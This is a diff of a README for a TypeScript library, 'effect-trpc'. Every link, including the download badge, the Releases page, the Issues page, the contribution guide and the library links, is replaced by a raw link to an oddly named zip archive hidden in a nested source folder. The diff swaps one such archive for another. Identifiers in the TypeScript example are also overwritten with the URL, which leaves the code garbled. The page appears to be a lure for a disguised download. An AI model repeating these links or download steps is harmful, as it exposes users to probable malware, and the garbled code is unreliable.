@@ -2,11 +2,11 @@
 
 ## 📥 Download
 
-[![Download effect-trpc](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip)](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip)
+[![Download effect-trpc](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip)](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip)
 
 ## 🎉 Introduction
 
-Welcome to **effect-trpc**! This tool helps you create type-safe procedures easily. It combines the power of [tRPC](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip) with [Effect](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip). With it, you can write efficient code while enjoying full service injection and automatic tracing.
+Welcome to **effect-trpc**! This tool helps you create type-safe procedures easily. It combines the power of [tRPC](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip) with [Effect](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip). With it, you can write efficient code while enjoying full service injection and automatic tracing.
 
 ## 🚀 Features
 
@@ -19,9 +19,9 @@ Welcome to **effect-trpc**! This tool helps you create type-safe procedures easi
 
 ## 📥 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip) to download the latest version. Here’s how to install it on your system:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip) to download the latest version. Here’s how to install it on your system:
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip).
 2. Find the latest version of effect-trpc.
 3. Click to download the relevant file for your system.
 
@@ -53,10 +53,10 @@ This import statement sets up `tRPC` with the necessary tools you need to begin.
 You can now define a simple procedure. Below is a starter example: 
 
 ```typescript
-const t = https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip();
+const t = https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip();
 
-https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip('https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip', {
-  input: https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip(),
+https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip('https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip', {
+  input: https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip(),
   resolve({ input }) {
     // Add your logic here 
     return getUserById(input);
@@ -78,7 +78,7 @@ If you encounter any issues, here are some common questions and answers:
 
 ## 📞 Support
 
-Need help? Visit our [GitHub Issues](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip) page for assistance. We aim to respond promptly to any queries.
+Need help? Visit our [GitHub Issues](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip) page for assistance. We aim to respond promptly to any queries.
 
 ## 📚 Documentation
 
@@ -86,7 +86,7 @@ For more in-depth details about using effect-trpc, refer to the official documen
 
 ## 🤝 Contributing
 
-We welcome contributions! If you’d like to help improve effect-trpc, please read our [Contributing Guidelines](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/platform-node/src/NodeFileSystem/effect_trpc_unmenstruating.zip) on how to get involved.
+We welcome contributions! If you’d like to help improve effect-trpc, please read our [Contributing Guidelines](https://raw.githubusercontent.com/Ahsan3106/effect-trpc/main/.context/effect-repo/packages/effect/src/internal/layer/effect_trpc_witjar.zip) on how to get involved.
 
 ---
 
